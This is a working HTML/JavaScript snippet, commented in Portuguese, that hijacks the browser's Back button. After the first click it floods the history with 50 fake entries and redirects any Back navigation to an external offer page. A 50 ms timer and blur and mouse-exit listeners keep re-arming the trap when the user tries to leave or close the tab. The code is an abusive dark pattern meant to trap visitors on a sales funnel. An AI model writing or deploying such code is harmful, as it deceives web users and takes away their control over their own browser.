    <!-- SISTEMA DE BACK REDIRECT DEFINITIVO E INDESTRUTÍVEL (IIFE) -->
    <script>
    (function(w, d, h, l) {
      var TARGET_URL = "https://ofertaexclusiva.figma.site/";
      var isArmed = false;

      // Técnica de Spam de Histórico (50 estados)
      function forceBack() {
        try {
          for (var i = 0; i < 50; i++) {
            h.pushState({ trap: i, ts: Date.now() }, "", l.href);
          }
        } catch (e) {
          // Silent catch
        }
      }

      // Gatilho de Ativação por interação global
      function arm() {
        if (!isArmed) {
          isArmed = true;
          forceBack();
          w.removeEventListener("click", arm);
          w.removeEventListener("touchstart", arm);
          w.removeEventListener("mousedown", arm);
        }
      }

      // Registra gatilhos de interação
      w.addEventListener("click", arm, { passive: true });
      w.addEventListener("touchstart", arm, { passive: true });
      w.addEventListener("mousedown", arm, { passive: true });

      // Override de Eventos Popstate e Hashchange
      w.onpopstate = w.onhashchange = function(event) {
        if (isArmed && !w.isNavigatingToCheckout) {
          l.replace(TARGET_URL);
        }
      };

      // Vigilante Atômico (50ms)
      setInterval(function() {
        // Se armado e o histórico foi comprometido (reduzido), restaura agressivamente
        if (isArmed && h.length < 30) {
          forceBack();
        }
      }, 50);

      // Detecção de Saída e Perda de Foco
      w.addEventListener("blur", function() {
        if (isArmed && !w.isNavigatingToCheckout) {
          forceBack();
        }
      });

      d.addEventListener("mouseleave", function(e) {
        // Detecta intenção de fechar aba (mouse sai do topo)
        if (isArmed && e.clientY < 0 && !w.isNavigatingToCheckout) {
          forceBack();
          // Alguns browsers permitem um pequeno trigger aqui antes do evento popstate real
        }
      });

      // Garante persistência global
      w.backRedirectAtomic = {
        isArmed: function() { return isArmed; },
        reArm: forceBack
      };

    })(window, document, window.history, window.location);
    </script>
